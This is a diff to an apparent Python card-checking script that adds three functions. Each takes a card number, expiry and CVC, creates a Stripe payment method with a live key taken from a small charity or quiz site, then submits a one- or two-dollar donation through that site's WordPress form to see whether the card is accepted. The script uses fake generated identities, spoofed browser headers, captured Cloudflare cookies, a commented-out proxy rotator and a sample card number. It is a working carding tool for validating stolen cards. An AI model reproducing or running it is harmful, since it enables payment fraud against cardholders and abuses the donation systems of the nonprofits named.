@@ -3314,8 +3314,323 @@ def go16(cc_input: str) -> str:
             
     except Exception as e:
         print(f"Error occurred: {e}")
-#================================        
-#test_card = "5178057998269695|04|2029|007"
+#================================
+# --- Main CC Check Function ---
+def go17(cc_input: str) -> str:
+    try:
+        n, mm, yy, cvc = cc_input.strip().split("|")
+
+        if int(mm) < 10 and not mm.startswith("0"):
+            mm = f"0{mm}"
+        if not yy.startswith("20"):
+            yy = f"20{yy}"
+
+        user = generate_user_agent()
+        r = requests.Session()
+        r.verify = False
+
+        first_name, last_name = generate_full_name()
+        kaddress, city, country, postcode, phone = generate_address()
+        email = generate_email()
+        username = generate_username()
+        corr = generate_random_code()
+        sess = generate_random_code()
+
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")
+        	
+        #1
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
+        }
+        
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F882aee1fe0%3B+stripe-js-v3%2F882aee1fe0%3B+card-element&referrer=https%3A%2F%2Foutofthewhale.com&time_on_page=38909&client_attribution_metadata[client_session_id]=a42e8d65-7237-4a78-833a-34418a6a92fb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RtEZlFhpeDtaWN1yTOZ2iLvQgoq4chMxUrSGcfxqT9dJKuTpCsGFT4bfwoqTlh6uTrFOcazYs8SpPuZKBDIOCco00zWYOrPfQ'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        res_json = response.json()
+        pm = res_json.get('id')
+        print(f"G17 ID Response: {pm}")
+        if not id:
+            print("Failed to get payment method.")
+            return
+                
+        #2
+        cookies = {
+            '__stripe_mid': '332a2966-8706-49bf-806a-d7d228cf1cbceab02b',
+            '__stripe_sid': '6555e5e1-1ac3-4406-a3c8-59f14c4ba2eb402ae2',
+        }
+        
+        headers = {
+            'authority': 'outofthewhale.com',
+            'accept': '*/*',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__stripe_mid=332a2966-8706-49bf-806a-d7d228cf1cbceab02b; __stripe_sid=6555e5e1-1ac3-4406-a3c8-59f14c4ba2eb402ae2',
+            'origin': 'https://outofthewhale.com',
+            'referer': 'https://outofthewhale.com/fuel-the-mission/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        params = {
+            't': '1767743550931',
+        }
+        
+        data = {
+            'data': f'__fluent_form_embded_post_id=2282&_fluentform_6_fluentformnonce=889e52da2b&_wp_http_referer=%2Ffuel-the-mission%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&input_text_2=&email=&address1%5Baddress_line_1%5D=&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=&address1%5Bstate%5D=&address1%5Bzip%5D=&address1%5Bcountry%5D=&custom-payment-amount=2&payment_method=stripe&__stripe_payment_method_id={pm}',
+            'action': 'fluentform_submit',
+            'form_id': '6',
+        }
+        
+        response = requests.post(
+            'https://outofthewhale.com/wp-admin/admin-ajax.php',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        if 'errors' in response.text:
+            result2 = response.json()['errors']                      	
+            return result2 #stop
+            	
+        else:
+            print("❌ Payment no need Rq4. Stopping here.")
+            result2 = response.text
+            return result2  #stop
+            
+    except Exception as e:
+        print(f"Error occurred: {e}")
+#================================
+# --- Main CC Check Function ---
+def go18(cc_input: str) -> str:
+    try:
+        n, mm, yy, cvc = cc_input.strip().split("|")
+
+        if int(mm) < 10 and not mm.startswith("0"):
+            mm = f"0{mm}"
+        if not yy.startswith("20"):
+            yy = f"20{yy}"
+
+        user = generate_user_agent()
+        r = requests.Session()
+        r.verify = False
+
+        first_name, last_name = generate_full_name()
+        kaddress, city, country, postcode, phone = generate_address()
+        email = generate_email()
+        username = generate_username()
+        corr = generate_random_code()
+        sess = generate_random_code()
+
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")
+        	
+        #1
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
+        }
+        
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F882aee1fe0%3B+stripe-js-v3%2F882aee1fe0%3B+card-element&referrer=https%3A%2F%2Falliesagainstbullying.org&time_on_page=46071&client_attribution_metadata[client_session_id]=eddceaa6-2913-439f-90fc-34935c2fd830&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51S5dV81FwZjXFTOYUE8mMplzJeJuL48X1D7EJyBIeKQ9rv8cwZCJxG4Pp6tGGr6NEQQAGmCWsEKdtAmqLHpaynzU000kQeHaJh'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        res_json = response.json()
+        pm = res_json.get('id')
+        print(f"G18 ID Response: {pm}")
+        if not id:
+            print("Failed to get payment method.")
+            return
+                
+        #2
+        cookies = {
+            '__stripe_mid': '1720b155-55b8-4bb5-a429-30093d73cddcf37282',
+            '__stripe_sid': '8d04b9d6-3904-4399-8262-4a7aa22400b84ea2eb',
+        }
+        
+        headers = {
+            'authority': 'alliesagainstbullying.org',
+            'accept': '*/*',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__stripe_mid=1720b155-55b8-4bb5-a429-30093d73cddcf37282; __stripe_sid=8d04b9d6-3904-4399-8262-4a7aa22400b84ea2eb',
+            'origin': 'https://alliesagainstbullying.org',
+            'referer': 'https://alliesagainstbullying.org/give/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        params = {
+            't': '1767744250157',
+        }
+        
+        data = {
+            'data': f'__fluent_form_embded_post_id=31812&_fluentform_11_fluentformnonce=b3b15c8b9a&_wp_http_referer=%2Fgive%2F&custom-payment-amount_1=1&payment_input_2=4&payment_input_3=0&payment_input_3_custom_0=&payment_method_1=stripe&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&address1%5Baddress_line_1%5D=&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=&address1%5Bstate%5D=&address1%5Bzip%5D=&address1%5Bcountry%5D=&alt_s=&luwzrc885=898300&payment_input%5B%5D=&__stripe_payment_method_id={pm}',
+            'action': 'fluentform_submit',
+            'form_id': '11',
+        }
+        
+        response = requests.post(
+            'https://alliesagainstbullying.org/wp-admin/admin-ajax.php',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        if 'errors' in response.text:
+            result2 = response.json()['errors']                      	
+            return result2 #stop
+            	
+        else:
+            print("❌ Payment no need Rq4. Stopping here.")
+            result2 = response.text
+            return result2  #stop
+            
+    except Exception as e:
+        print(f"Error occurred: {e}")
+#================================
+# --- Main CC Check Function ---
+def go19(cc_input: str) -> str:
+    try:
+        n, mm, yy, cvc = cc_input.strip().split("|")
+
+        if int(mm) < 10 and not mm.startswith("0"):
+            mm = f"0{mm}"
+        if not yy.startswith("20"):
+            yy = f"20{yy}"
+
+        user = generate_user_agent()
+        r = requests.Session()
+        r.verify = False
+
+        first_name, last_name = generate_full_name()
+        kaddress, city, country, postcode, phone = generate_address()
+        email = generate_email()
+        username = generate_username()
+        corr = generate_random_code()
+        sess = generate_random_code()
+
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")
+        	
+        #1
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
+        }
+        
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F882aee1fe0%3B+stripe-js-v3%2F882aee1fe0%3B+card-element&referrer=https%3A%2F%2Fwholehappyfree.com&time_on_page=25522&client_attribution_metadata[client_session_id]=959f59ff-bcd5-47ff-b5e1-e21a1f0ebb9a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51OIGDfACe8DWoXCxArk2hEVZu3RjTvzHjQoLEwRxA5fGjO4igyLWG6sIZhQwGHGT7Llir4ZY6dPrPAFAsGY9sLZy008ZCT66Lb'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        res_json = response.json()
+        pm = res_json.get('id')
+        print(f"G19 ID Response: {pm}")
+        if not id:
+            print("Failed to get payment method.")
+            return
+                
+        #2
+        cookies = {
+            '__cf_bm': 'vZRhKUkdzkbdhuM_PzDjIwBZ5EAJnq80US31GUOHtnM-1767745117-1.0.1.1-5WX6BjXd_uCWypsbkyNu1D88F9GoWCwifszt1adRBiihf3qph3fjrY17WslINFrizViuAQrydkvHmjDns442sB0vnK4.WNVrVE_u9mpbQ_U',
+            'cf_clearance': 'wuB2BbHtqVU8MWlkIowayq_d9mRA3y26PL4hQiEt3Ic-1767745120-1.2.1.1-qrrDk5ghgtV359.ySJUCyXlK00KmQ3BDFVPKDkQXTxvSOtDZEuPjujf61HJSZFufB3W5OYbfV04YPyU4FyMHobTEcpkq3v8crANJ_5iBHexwlL_b9IeSJ0nbJDNHFTJGe3lQriNI0sd2GwxBkxeWg47aNTspBXJ1M5QR1lL1XpK77vTG3pqnK588kB1e_usnb5e6mgv6SRKOjo5vpzkVrRIwygypt_ONlUbiCmfaFWQ',
+            '__stripe_mid': '8c844cb2-be64-4c08-98ca-dd2545b46969be1dbe',
+            '__stripe_sid': '6a0af94b-7179-4cc3-adaa-3b16bbeca98a199800',
+        }
+        
+        headers = {
+            'authority': 'wholehappyfree.com',
+            'accept': '*/*',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__cf_bm=vZRhKUkdzkbdhuM_PzDjIwBZ5EAJnq80US31GUOHtnM-1767745117-1.0.1.1-5WX6BjXd_uCWypsbkyNu1D88F9GoWCwifszt1adRBiihf3qph3fjrY17WslINFrizViuAQrydkvHmjDns442sB0vnK4.WNVrVE_u9mpbQ_U; cf_clearance=wuB2BbHtqVU8MWlkIowayq_d9mRA3y26PL4hQiEt3Ic-1767745120-1.2.1.1-qrrDk5ghgtV359.ySJUCyXlK00KmQ3BDFVPKDkQXTxvSOtDZEuPjujf61HJSZFufB3W5OYbfV04YPyU4FyMHobTEcpkq3v8crANJ_5iBHexwlL_b9IeSJ0nbJDNHFTJGe3lQriNI0sd2GwxBkxeWg47aNTspBXJ1M5QR1lL1XpK77vTG3pqnK588kB1e_usnb5e6mgv6SRKOjo5vpzkVrRIwygypt_ONlUbiCmfaFWQ; __stripe_mid=8c844cb2-be64-4c08-98ca-dd2545b46969be1dbe; __stripe_sid=6a0af94b-7179-4cc3-adaa-3b16bbeca98a199800',
+            'origin': 'https://wholehappyfree.com',
+            'referer': 'https://wholehappyfree.com/trust-quiz-confirmation/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        params = {
+            't': '1767745144878',
+        }
+        
+        data = {
+            'data': f'__fluent_form_embded_post_id=812&_fluentform_4_fluentformnonce=0955c3dbde&_wp_http_referer=%2Ftrust-quiz-confirmation%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&payment_input=.99&payment_method=stripe&__entry_intermediate_hash=a1eae06d3fde248df2688486814380b0&__stripe_payment_method_id={pm}',
+            'action': 'fluentform_submit',
+            'form_id': '4',
+        }
+        
+        response = requests.post(
+            'https://wholehappyfree.com/wp-admin/admin-ajax.php',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        if 'errors' in response.text:
+            result2 = response.json()['errors']                      	
+            return result2 #stop
+            	
+        else:
+            print("❌ Payment no need Rq4. Stopping here.")
+            result2 = response.text
+            return result2  #stop
+            
+    except Exception as e:
+        print(f"Error occurred: {e}")
+#================================
+        
+#test_card = "5348690006443400|11|28|558"
 #print(go0(test_card))
 #print(go1(test_card))
 #print(go2(test_card))
@@ -3333,3 +3648,6 @@ def go16(cc_input: str) -> str:
 #print(go14(test_card))
 #print(go15(test_card))
 #print(go16(test_card))
+#print(go17(test_card))
+#print(go18(test_card))
+#print(go19(test_card))
